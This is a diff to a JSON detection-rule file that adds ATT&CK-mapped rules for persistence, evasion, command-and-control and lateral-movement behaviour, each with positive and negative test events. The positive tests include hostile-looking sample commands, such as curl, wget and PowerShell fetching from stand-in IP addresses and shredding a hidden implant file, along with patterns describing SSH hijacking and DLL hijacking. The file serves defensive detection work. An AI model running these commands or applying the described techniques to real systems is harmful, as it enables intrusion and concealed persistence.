@@ -1608,7 +1608,11 @@
        "support_388945a0",
        "admin",
        "test",
-       "user1"
+       "user1",
+       "pi",
+       "ubnt",
+       "vagrant",
+       "cisco"
       ]
      },
      {
@@ -5277,6 +5281,485 @@
      {
       "executable": "C:\\Windows\\System32\\msiexec.exe",
       "command": "msiexec /?"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-systemd-run-timer",
+   "name": "systemd-run creates a transient timer",
+   "description": "systemd-run with a calendar or boot timer option schedules recurring execution without leaving a unit file on disk.",
+   "tactic": "Persistence",
+   "technique": "T1053.006",
+   "technique_name": "Scheduled Task/Job: Systemd Timers",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])systemd-run$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s--on-(calendar|boot|startup|unit-active|unit-inactive)[= ]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "systemd",
+    "timer"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --user --on-calendar=*:0/5 /tmp/x"
+     },
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --on-boot=30s /opt/a"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --scope -p MemoryMax=1G make -j8"
+     },
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --user --unit=job sleep 5"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-shred-hidden-tmp-file",
+   "name": "shred or srm of a hidden file in a temp directory",
+   "description": "A secure-delete tool removes a dot-file from /tmp, /var/tmp or /dev/shm, the pattern of an implant erasing itself.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.004",
+   "technique_name": "Indicator Removal: File Deletion",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(shred|srm|wipe)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*u[a-z]*\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp|/var/tmp|/dev/shm)/\\.[^/\\s]+"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "delete",
+    "noisy-risk"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u -z /tmp/.implant"
+     },
+     {
+      "executable": "/usr/bin/srm",
+      "command": "srm -u /dev/shm/.k"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u /tmp/session.key"
+     },
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -n 3 /home/a/notes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-legacy-ie-useragent-client",
+   "name": "Command-line HTTP client posing as an obsolete Internet Explorer",
+   "description": "curl or wget sets a MSIE 4 to 8 user agent, a long-lived habit of commodity beacons and droppers.",
+   "tactic": "Command and Control",
+   "technique": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(curl|wget)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-A\\s|--user-agent[= ]|\\s-U\\s)[\\\"']?mozilla/[0-9.]+ \\(compatible; msie [4-8]\\.0"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "c2",
+    "useragent"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s -A \"Mozilla/4.0 (compatible; MSIE 6.0)\" http://203.0.113.1/g"
+     },
+     {
+      "executable": "/usr/bin/wget",
+      "command": "wget --user-agent=\"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" http://203.0.113.1/x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s -A \"Mozilla/5.0 (X11; Linux x86_64)\" https://example.com"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-ps-webclient-header-raw-ip",
+   "name": "PowerShell WebClient with a custom Cookie or Authorization header to a raw IP",
+   "description": "A WebClient sets a Cookie or Authorization header and then fetches from a bare IP address, the shape of a scripted HTTP beacon.",
+   "tactic": "Command and Control",
+   "technique": "T1071.001",
+   "technique_name": "Application Layer Protocol: Web Protocols",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "headers\\.add\\(\\s*['\\\"](cookie|authorization)['\\\"]"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}[:/]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "c2",
+    "http"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c \"$w=New-Object Net.WebClient;$w.Headers.Add('Cookie','a=b');$w.DownloadString('http://203.0.113.9/b')\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c \"$w=New-Object Net.WebClient;$w.Headers.Add('Authorization','Bearer x');$w.DownloadString('https://api.contoso.com/v1')\""
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c Get-Date"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-ssh-mux-socket-from-tmp",
+   "name": "ssh reuses a control socket stored in a temp directory",
+   "description": "ssh -S points at a multiplex control socket under /tmp, /var/tmp or /dev/shm, the way an attacker rides another user's authenticated session.",
+   "tactic": "Lateral Movement",
+   "technique": "T1563.001",
+   "technique_name": "Remote Service Session Hijacking: SSH Hijacking",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])ssh$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-S\\s+(/tmp|/var/tmp|/dev/shm)/\\S+"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "ssh",
+    "hijack"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -S /tmp/ssh-mux-admin@10.0.0.8:22 -O forward admin@10.0.0.8"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -S /dev/shm/cm-1 host"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh admin@10.0.0.8"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -S ~/.ssh/cm-x host -O exit"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-specialaccounts-userlist-set",
+   "name": "Winlogon SpecialAccounts UserList value written",
+   "description": "A value under Winlogon\\SpecialAccounts\\UserList hides that account from the logon screen.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.002",
+   "technique_name": "Hide Artifacts: Hidden Users",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\winlogon\\\\specialaccounts\\\\userlist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "registry",
+    "hidden-user"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
+       "value_name": "svc",
+       "value_data": "0",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+       "value_name": "Shell",
+       "value_data": "explorer.exe",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-unsigned-system-named-dll-outside-system",
+   "name": "Unsigned DLL carrying a hijack-prone system name loaded from an application folder",
+   "description": "An unsigned module named like a Windows system DLL (version, winmm, cryptsp, dwmapi and similar) loads from outside the Windows directories, the classic search-order hijack.",
+   "tactic": "Persistence",
+   "technique": "T1574.001",
+   "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "regex",
+      "pattern": "\\\\(version|winmm|cryptsp|dwmapi|wtsapi32|uxtheme|msimg32|dbghelp|secur32|userenv|winhttp)\\.dll$"
+     },
+     {
+      "not": {
+       "field": "module_path",
+       "op": "regex",
+       "pattern": "^[a-z]:\\\\windows\\\\"
+      }
+     },
+     {
+      "field": "signed",
+      "op": "regex",
+      "pattern": "^false$"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "module",
+    "dll-hijack"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\Program Files\\VendorApp\\version.dll",
+       "signed": "false",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Windows\\System32\\version.dll",
+       "signed": "false",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "C:\\Program Files\\VendorApp\\version.dll",
+       "signed": "true",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-unix-unsigned-module-from-temp",
+   "name": "Unsigned shared object or dylib loaded from a world-writable directory",
+   "description": "An unsigned library loads from /tmp, /var/tmp, /dev/shm or /Users/Shared, a dylib or shared-object hijack staging area.",
+   "tactic": "Persistence",
+   "technique": "T1574.004",
+   "technique_name": "Hijack Execution Flow: Dylib Hijacking",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "regex",
+      "pattern": "^(/tmp|/private/tmp|/var/tmp|/dev/shm|/users/shared)/"
+     },
+     {
+      "field": "signed",
+      "op": "regex",
+      "pattern": "^false$"
+     },
+     {
+      "field": "module_kind",
+      "op": "in",
+      "patterns": [
+       "so"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "module",
+    "dylib"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "/Users/Shared/lib/libz.1.dylib",
+       "signed": "false",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "/tmp/libx.so",
+       "signed": "false",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "/usr/lib/libz.so.1",
+       "signed": "false",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "/tmp/libx.so",
+       "signed": "true",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
      }
     ]
    }
